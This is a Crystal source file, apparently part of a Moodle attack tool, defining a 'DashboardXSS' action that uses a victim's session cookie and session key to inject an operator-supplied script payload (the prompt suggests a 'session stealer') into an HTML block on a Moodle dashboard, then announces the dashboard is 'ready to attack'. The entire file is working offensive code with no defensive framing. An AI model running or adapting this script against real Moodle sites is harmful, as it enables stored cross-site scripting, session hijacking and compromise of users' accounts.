# TODO: Write documentation for `Toodlemoodle`
require "http/client"
require "option_parser"
require "json"
require "base64"

module TMoodleActions
  class DashboardXSS
    def perform(target)
      puts "Please enter your session key. Use the helper command."
      sess_key = gets()
      puts "Please enter your moodle session."
      moodle_session = gets().not_nil!
      puts "Please visit #{target}/my/index.php?sesskey=#{sess_key}&bui_addblock=html to add an HTML block to your dashboard. Once the block is added, click on configure, copy the URL, paste it, and hit enter."
      block_edit_url = gets()
      block_regex = block_edit_url.not_nil!.match(/sesskey=(?<sess_key>.*)&bui_editid=(?<edit_id>.*)/)
      session_key = block_regex.try &.["sess_key"]
      block_id = block_regex.try &.["edit_id"]
      puts "Session key: #{session_key}"
      puts "Block id: #{block_id}"
      puts "Please enter an XSS payload (e.g. session stealer) to send including <script> tags:"
      payload = gets().not_nil!
      puts "Sending payload to target..."
      headers = HTTP::Headers.new
      headers.add("Cookie", "MoodleSession=" + moodle_session)
      headers.add("Content-Type", "application/x-www-form-urlencoded")
      # data = HTTP::Params.encode(data)
      params = HTTP::Params.build do |form|
        form.add "bui_editid", block_id
        form.add "sesskey", session_key
        form.add "_qf__block_html_edit_form", "1"
        form.add "config_text[text]", payload
      end
      post = HTTP::Client.post(target + "/my/index.php", headers: headers, body: params)
      if post.status_code == 301
        puts "Payload delivered. Your dashboard is now ready to attack."
      else
        puts "Error: " + post.body
      end
    end
  end
end
